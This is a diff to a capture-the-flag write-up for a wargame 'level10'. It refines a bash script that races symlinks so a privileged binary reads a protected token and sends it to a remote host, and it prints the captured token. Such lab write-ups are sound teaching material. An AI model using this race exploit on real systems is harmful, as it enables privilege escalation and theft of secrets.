@@ -355,6 +355,14 @@ First create a dummy file where you have the access rights: `echo garbage > /tmp
 ```bash
 #!/bin/bash
 
+cleanup() {
+    echo "Cleaning up..."
+    kill $(jobs -p)
+    exit 0
+}
+
+trap cleanup SIGINT SIGTERM
+
 while true; do
     ln -sf /tmp/garbage /tmp/exploit_link
     ln -sf /home/user/level10/token /tmp/exploit_link
@@ -362,9 +370,9 @@ done &
 
 while true; do
     /home/user/level10/level10 /tmp/exploit_link 10.x.x.x
-done
+done &
 
-kill $(jobs -p)
+wait
 ```
 
 Running this script will sometimes fail the `access` check and sometimes fail the `read` of the file. But if the timing is right, it will `access` `/etc/passwd` and `read+send` `/home/user/level10/token` to the host machine: `woupa2yuojeeaaed06riuj63c`.
